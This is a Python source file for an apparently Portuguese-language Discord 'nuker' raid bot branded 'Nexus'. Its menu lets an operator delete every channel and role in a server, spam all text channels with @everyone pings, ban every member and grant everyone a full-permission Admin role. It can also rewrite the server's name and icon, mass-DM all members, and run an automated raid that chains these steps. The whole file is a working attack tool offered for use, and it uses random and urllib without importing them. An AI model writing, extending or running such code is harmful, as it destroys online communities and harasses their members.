import os
import time
import discord
from discord.ext import commands
from pystyle import Colors, Colorate
import asyncio
import config
from discord import Activity, ActivityType

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Canal {channel.name} deletado - Tempo gasto: {end_time - start_time:.2f} segundos")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível deletar o canal {channel.name}: {e}")))
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Cargo {role.name} deletado - Tempo gasto: {end_time - start_time:.2f} segundos")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível deletar o cargo {role.name}: {e}")))
        return False

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()
            channel_futures = [delete_channel(channel) for channel in guild.channels]
            role_futures = [delete_role(role) for role in guild.roles]
            channel_results = await asyncio.gather(*channel_futures)
            role_results = await asyncio.gather(*role_futures)
            end_time_total = time.time()
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)
            roles_deleted = role_results.count(True)
            roles_not_deleted = role_results.count(False)
            print((Colorate.Color(Colors.blue, f"""[!] Comando Usado: Nuke - {channels_deleted} canais deletados, {channels_not_deleted} canais não deletados 
{roles_deleted} cargos deletados, {roles_not_deleted} cargos não deletados - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos""")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)
        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Canal Criado: {new_channel.name} ({new_channel.id}) - Tempo gasto: {end_time - start_time:.2f} segundos")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível criar o canal {channel_type}: {e}")))
        return False

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_channels = int(input((Colorate.Color(Colors.blue, "Digite o número de canais a criar: "))))
            channel_type = input((Colorate.Color(Colors.blue, "Digite o tipo de canal (texto/voz): ")))
            channel_name = input((Colorate.Color(Colors.blue, "Digite o nome do canal: ")))
            if channel_type not in ['text', 'voice']:
                print((Colorate.Color(Colors.red, "[-] Tipo de canal inválido. Use 'texto' ou 'voz'.")))
                return
            channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]
            start_time_total = time.time()
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()
            channels_created = channel_results.count(True)
            channels_not_created = channel_results.count(False)
            print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Criar Canais - {channels_created} canais {channel_type} criados, {channels_not_created} canais não criados - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input((Colorate.Color(Colors.blue, "Digite o número de mensagens a enviar: "))))
            message_content = input((Colorate.Color(Colors.blue, "Digite o conteúdo da mensagem ou 'embed' para usar o embed do config: ")))
            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input((Colorate.Color(Colors.blue, "Incluir @everyone? (sim/não): "))).lower()
                include_everyone = include_everyone_input == 'sim'
            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]
            await asyncio.gather(*tasks)
            end_time_total = time.time()
            print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Spam - {num_messages} mensagens enviadas a todos os canais de texto - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Color(Colors.green, f"[+] Mensagem enviada para {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível enviar mensagens para {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG
        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )
        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))
        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))
        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')
        await channel.send(content=message, embed=embed)
        print((Colorate.Color(Colors.green, f"[+] Embed enviado para {channel.name}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível enviar embed para {channel.name}: {e}")))

from config import NO_BAN_KICK_ID

async def ban_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Color(Colors.blue, "Tem certeza que deseja banir todos os membros? (sim/não): "))).lower()
            if confirm == "sim":
                start_time_total = time.time()
                tasks = [
                    ban_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()
                members_banned = results.count(True)
                members_failed = results.count(False)
                print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Banir Todos - {members_banned} membros banidos, {members_failed} membros não banidos - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")))
            else:
                print((Colorate.Color(Colors.red, "[-] Operação de banir todos cancelada.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def ban_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.ban()
            print((Colorate.Color(Colors.green, f"[+] Membro {member.name} banido")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Color(Colors.yellow, f"[+] Membro {member.name} está na lista de proteção, não banido.")))
            return False
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Não foi possível banir {member.name}: {e}")))
        return False

async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Color(Colors.blue, "Digite o ID do usuário ou pressione Enter para todo o servidor: ")))
            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            start_time_total = time.time()
            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())
            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()
                            await member.add_roles(admin_role)
                            end_time_member = time.time()
                            print((Colorate.Color(Colors.green, f"[+] Cargo de administrador concedido a {member.name} - Tempo gasto: {end_time_member - start_time_member:.2f} segundos")))
                    except Exception as e:
                        print((Colorate.Color(Colors.red, f"[-] Não foi possível conceder cargo de administrador a {member.name}: {e}")))
                end_time_total = time.time()
                print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Obter Admin - Cargo de administrador concedido a todo o servidor - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")))
            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Color(Colors.green, f"[+] Cargo de administrador concedido a {target_user.name} - Tempo gasto: {end_time_target_user - start_time_target_user:.2f} segundos")))
                        print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Obter Admin - Cargo de administrador concedido ao usuário - Tempo total gasto: {end_time_target_user - start_time_target_user:.2f} segundos")))
                    else:
                        print((Colorate.Color(Colors.red, f"[-] Usuário com ID {user_id_or_all} não encontrado.")))
                except ValueError:
                    print((Colorate.Color(Colors.red, "[-] ID de usuário inválido. Digite um ID válido ou pressione Enter para todo o servidor.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER_CONFIG
            new_name = input((Colorate.Color(Colors.blue, f"Digite o novo nome do servidor ou pressione Enter para usar o nome do config: "))) or server_config['new_name']
            new_icon = input((Colorate.Color(Colors.blue, f"Digite a URL do novo ícone do servidor ou pressione Enter para usar o ícone do config: "))) or server_config['new_icon']
            new_description = input((Colorate.Color(Colors.blue, f"Digite a nova descrição do servidor ou pressione Enter para usar a descrição do config: "))) or server_config['new_description']
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print((Colorate.Color(Colors.green, f"[+] Nome do servidor alterado")))
            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print((Colorate.Color(Colors.green, f"[+] Ícone alterado")))
            await guild.edit(description=new_description)
            print((Colorate.Color(Colors.green, f"[+] Descrição alterada")))
            end_time_guild_changer = time.time()
            print((Colorate.Color(Colors.blue, f"[!] Comando Usado: Alterar Servidor - Informações do servidor atualizadas com sucesso - Tempo total gasto: {end_time_guild_changer - start_time_guild_changer:.2f} segundos")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            message_content = input((Colorate.Color(Colors.blue, "Digite a mensagem para enviar a todos os membros: ")))
            members_sent = 0
            members_fail = 0
            start_time_total = time.time()
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time()
                        await member.send(message_content)
                        end_time_member = time.time()
                        print((Colorate.Color(Colors.green, f"[+] Mensagem enviada para {member.name} ({member.id}) - Tempo gasto: {end_time_member - start_time_member:.2f} segundos")))
                        members_sent += 1
                    except Exception as e:
                        print((Colorate.Color(Colors.red, f"[-] Não foi possível enviar mensagem para {member.name}: {e}")))
                        members_fail += 1
            end_time_total = time.time()
            print((Colorate.Color(Colors.blue, f"[!] Comando Usado: DM Todos - {members_sent} mensagens enviadas, {members_fail} mensagens falharam - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")))
        else:
            print((Colorate.Color(Colors.red, "[-] Servidor não encontrado.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Erro: {e}")))

from config import AUTO_RAID_CONFIG

def log_message(color, message):
    print(Colorate.Color(color, message))

async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(Colors.yellow, f"[-] Mensagem {i+1}/{num_messages} enviada para o canal {channel.name}")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Não foi possível enviar mensagens para o canal {channel.name}: {e}")
        return False

async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']
            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]
            await asyncio.gather(*tasks)
            end_time_total = time.time()
            log_message(Colors.blue, f"[!] Comando Usado: Spam - {num_messages} mensagens enviadas a todos os canais de texto - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos")
        else:
            log_message(Colors.red, "[-] Servidor não encontrado.")
    except Exception as e:
        log_message(Colors.red, f"[-] Erro: {e}")

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()
            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']
            channel_futures = [delete_channel(channel) for channel in guild.channels]
            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]
            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)
            end_time_total = time.time()
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)
            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)
            await spam_channels(server_id)
            log_message(Colors.blue, f"""[!] Comando Usado: Nuke - {channels_deleted} canais deletados, {channels_not_deleted} canais não deletados 
[!] Comando Usado: Criar Canais - {channels_created} canais {channel_type} criados, {channels_not_created} canais não criados - Tempo total gasto: {end_time_total - start_time_total:.2f} segundos""")
        else:
            log_message(Colors.red, "[-] Servidor não encontrado.")
    except Exception as e:
        log_message(Colors.red, f"[-] Erro: {e}")

bot_token = input((Colorate.Color(Colors.red, "Token do Bot: ")))
server_id = input((Colorate.Color(Colors.red, "Digite o ID do Servidor: ")))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print((Colorate.Color(Colors.blue, f'[+] {bot.user.name} está online!')))
    print((Colorate.Color(Colors.blue, f'[+] ID do Servidor: {server_id}')))
    server = bot.get_guild(int(server_id))
    if server:
        print((Colorate.Color(Colors.green, f'[+] Bot está no servidor especificado ({server.name})')))
    else:
        print((Colorate.Color(Colors.red, f'[-] Bot não está no servidor especificado')))
        return
    from config import BOT_PRESENCE
    presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
    await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))
    time.sleep(2)
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        choice = input((Colorate.Color(Colors.red, """

 ██████   █████              █████████   █████                                      
░░██████ ░░███              ███░░░░░███ ░░███                                       
 ░███░███ ░███  █████ █████░███    ░░░  ███████    ██████  ████████  █████████████  
 ░███░░███░███ ░░███ ░░███ ░░█████████ ░░░███░    ███░░███░░███░░███░░███░░███░░███ 
 ░███ ░░██████  ░░░█████░   ░░░░░░░░███  ░███    ░███ ░███ ░███ ░░░  ░███ ░███ ░███ 
 ░███  ░░█████   ███░░░███  ███    ░███  ░███ ███░███ ░███ ░███      ░███ ░███ ░███ 
 █████  ░░█████ █████ █████░░█████████   ░░█████ ░░██████  █████     █████░███ █████
░░░░░    ░░░░░ ░░░░░ ░░░░░  ░░░░░░░░░     ░░░░░   ░░░░░░  ░░░░░     ░░░░░ ░░░ ░░░░░ 
  v1.0                                        by Nexus          Team Project Nexus

 
 1 - Nuke
 2 - Criar Canais
 3 - Spam Canais (mensagens)
 4 - Ban All
 5 - Obter Admin
 6 - Reconfigurar Servidor 
 7 - DM All
 8 - Auto Raid                                   
                                                                                    
    Escolha:  """)))
        if choice == '1':
            await nuke(server_id)
        elif choice == '2':
            await create_channels(server_id)
        elif choice == '3':
            await spam_channel(server_id)
        elif choice == '4':
            await ban_all(server_id, bot.user.id)
        elif choice == '5':
            await get_admin(server_id)
        elif choice == '6':
            await change_server(server_id)
        elif choice == '7':
            await dm_all(server_id)
        elif choice == '8':
            await auto_raid(server_id)
        else:
            print((Colorate.Color(Colors.red, "[-] Escolha inválida")))
        time.sleep(4)

if __name__ == "__main__":
    bot.run(bot_token)
